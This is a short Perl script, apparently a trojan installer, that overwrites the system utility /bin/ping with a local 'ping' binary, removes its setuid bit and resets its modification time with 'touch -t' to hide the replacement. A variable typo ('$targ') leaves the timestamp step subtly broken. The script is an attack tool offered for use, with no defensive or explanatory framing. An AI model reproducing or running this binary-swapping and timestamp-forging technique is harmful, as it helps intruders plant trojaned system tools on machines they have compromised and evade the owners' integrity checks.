#!/usr/bin/perl

$target="/bin/ping";               # - the target suid utility
print "Installing...\n";

$time1 = (stat("$targ"))[9];
($sec, $min, $hour, $mday, $mon, $year, $wday, $yday, $isdst) =  localtime($time1); 
$mon = $mon+1;
if ($mon <10) { $mon = "0$mon" }
if ($year >99) { $year = substr $year,1,2; }
if ($mday <10) { $mday = "0$mday" }
if ($hour <10) { $hour = "0$hour" }
if ($min <10) { $min = "0$min" }

system("cp -f ./ping $target");
system("chmod -s $target");
system("touch -t ${year}${mon}${mday}${hour}${min} $target");

print "Done\n and please remember: 'mama told us to be god boys'"
